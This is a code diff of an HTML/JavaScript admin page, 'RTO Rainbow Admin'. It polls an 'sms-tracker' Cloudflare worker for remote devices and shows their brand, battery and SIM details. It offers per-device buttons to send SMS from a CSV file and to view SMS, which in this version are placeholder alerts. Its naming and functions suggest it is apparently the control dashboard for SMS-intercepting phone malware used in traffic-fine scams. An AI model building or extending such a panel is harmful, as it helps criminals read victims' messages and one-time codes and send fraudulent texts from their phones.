@@ -1,74 +1,140 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Live Admin Control</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RTO Rainbow Admin</title>
     <style>
-        :root { --red: #ff4444; --yellow: #ffbb33; --green: #00C851; --blue: #33b5e5; --pink: #ff4081; }
-        body { font-family: sans-serif; background: #121212; color: white; margin: 0; padding: 10px; }
-        .grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
-        .card { background: #1e1e1e; border: 2px solid var(--blue); border-radius: 10px; padding: 15px; }
-        .btn-group { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
-        button { flex: 1; padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: white; }
-        
-        /* Modal Style */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
-        .modal-box { background: #252525; padding: 20px; border-radius: 15px; width: 85%; max-width: 400px; text-align: center; border: 1px solid var(--pink); }
+        /* Color Palette */
+        :root {
+            --bg-black: #000000;
+            --card-gray: #1a1a1a;
+            --neon-blue: #00d2ff;
+            --neon-green: #39ff14;
+            --neon-pink: #ff007f;
+            --neon-yellow: #fff200;
+            --neon-red: #ff3131;
+            --white: #ffffff;
+        }
+
+        body { 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+            background: var(--bg-black); 
+            color: var(--white); 
+            margin: 0; 
+            padding: 10px;
+        }
+
+        h2 { text-align: center; color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); }
+
+        /* Grid System */
+        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
+        @media (min-width: 600px) { .grid { grid-template-columns: repeat(2, 1fr); } }
+
+        /* Card Design */
+        .card { 
+            background: var(--card-gray); 
+            border: 2px solid var(--neon-blue); 
+            border-radius: 15px; 
+            padding: 15px; 
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
+            transition: 0.3s;
+        }
+
+        .card:active { transform: scale(0.97); }
+
+        .device-header { display: flex; justify-content: space-between; align-items: center; }
+        .brand-name { color: var(--neon-yellow); font-size: 1.2rem; font-weight: bold; }
+        .battery-level { color: var(--neon-green); font-weight: bold; font-size: 0.9rem; }
+
+        /* Popups / Modal */
+        .modal { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.95); align-items: center; justify-content: center; z-index: 1000; 
+        }
+        .modal-box { 
+            background: #111; padding: 25px; border-radius: 20px; width: 85%; max-width: 400px; 
+            text-align: center; border: 2px solid var(--neon-pink); 
+        }
+
+        /* Colored Buttons */
+        .btn-stack { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
+        .btn { 
+            padding: 15px; border: none; border-radius: 10px; font-weight: bold; 
+            font-size: 1rem; cursor: pointer; text-transform: uppercase; 
+        }
+
+        .btn-green { background: var(--neon-green); color: black; box-shadow: 0 0 10px var(--neon-green); }
+        .btn-yellow { background: var(--neon-yellow); color: black; box-shadow: 0 0 10px var(--neon-yellow); }
+        .btn-blue { background: var(--neon-blue); color: black; box-shadow: 0 0 10px var(--neon-blue); }
+        .btn-red { background: var(--neon-red); color: white; margin-top: 15px; width: 100%; }
+
+        .details-text { color: var(--white); text-align: left; background: #222; padding: 10px; border-radius: 8px; margin-top: 10px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
-    <h2 style="text-align:center"ADMIN </h2>
-    <div id="grid" class="grid">Loading Devices...</div>
 
-    <div id="popup" class="modal">
+    <h2>MASTER CONTROL PANEL</h2>
+    <div id="deviceGrid" class="grid">
+        <p style="text-align:center; color:gray;">Scanning for active devices...</p>
+    </div>
+
+    <div id="modal" class="modal">
         <div class="modal-box">
-            <h3 id="pTitle" style="color:var(--yellow)"></h3>
-            <div id="pContent" style="margin: 15px 0;"></div>
-            <button onclick="closeP()" style="background:var(--red); width: 100%;">OK CLOSE</button>
+            <h3 id="mTitle" style="color:var(--neon-pink); margin-top:0;">DEVICE OPTIONS</h3>
+            <div id="mInfo" class="details-text"></div>
+            
+            <div class="btn-stack">
+                <button class="btn btn-green" onclick="alert('CSV Uploading...')">1. SEND SMS (GREEN)</button>
+                <button class="btn btn-yellow" onclick="alert('Fetching SMS...')">2. VIEW SMS (YELLOW)</button>
+                <button class="btn btn-blue" onclick="alert('Full Specs Loaded')">3. DETAILS (BLUE)</button>
+            </div>
+
+            <button class="btn btn-red" onclick="closeModal()">OK CLOSE (RED)</button>
         </div>
     </div>
 
     <script>
         const WORKER_URL = "https://sms-tracker-worker.vikash6759ub.workers.dev";
 
-        async function fetchDevices() {
+        async function loadData() {
             try {
                 const res = await fetch(`${WORKER_URL}/api/devices`);
-                const data = await res.json();
-                document.getElementById('grid').innerHTML = data.map(d => `
-                    <div class="card" onclick="showOptions('${d.id}', '${d.brand}')">
-                        <div style="float:right; color:var(--green)">${d.battery}%</div>
-                        <strong>${d.brand}</strong><br>
-                        <small style="color:var(--blue)">${d.sim_info}</small>
+                const devices = await res.json();
+                
+                if(devices.length === 0) return;
+
+                const grid = document.getElementById('deviceGrid');
+                grid.innerHTML = devices.map(d => `
+                    <div class="card" onclick="openMenu('${d.id}', '${d.brand}', '${d.battery}', '${d.sim_info}')">
+                        <div class="device-header">
+                            <span class="brand-name">${d.brand}</span>
+                            <span class="battery-level">🔋 ${d.battery}%</span>
+                        </div>
+                        <p style="margin: 10px 0 0 0; font-size: 0.8rem; color: #888;">ID: ${d.id}</p>
                     </div>
                 `).join('');
-            } catch (e) { document.getElementById('grid').innerText = "Error fetching data..."; }
+            } catch (e) { console.log("Waiting for signal..."); }
         }
 
-        function showOptions(id, brand) {
-            const html = `
-                <div class="btn-group">
-                    <button style="background:var(--green)" onclick="uploadCSV('${id}')">SEND SMS (CSV)</button>
-                    <button style="background:var(--yellow)" onclick="viewSMS('${id}')">VIEW SMS</button>
-                    <button style="background:var(--blue)" onclick="showDetails('${id}')">DETAILS</button>
-                </div>
+        function openMenu(id, brand, battery, sim) {
+            document.getElementById('mTitle').innerText = brand.toUpperCase();
+            document.getElementById('mInfo').innerHTML = `
+                <b>Status:</b> <span style="color:var(--neon-green)">ONLINE</span><br>
+                <b>Battery:</b> ${battery}%<br>
+                <b>SIM:</b> ${sim}<br>
+                <b>Device ID:</b> ${id}
             `;
-            openP(brand, html);
+            document.getElementById('modal').style.display = 'flex';
         }
 
-        function openP(title, body) {
-            document.getElementById('pTitle').innerText = title;
-            document.getElementById('pContent').innerHTML = body;
-            document.getElementById('popup').style.display = 'flex';
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
         }
 
-        function closeP() { document.getElementById('popup').style.display = 'none'; }
-
-        // Initial Load
-        setInterval(fetchDevices, 5000);
-        fetchDevices();
+        setInterval(loadData, 3000);
+        loadData();
     </script>
 </body>
 </html>
-
 
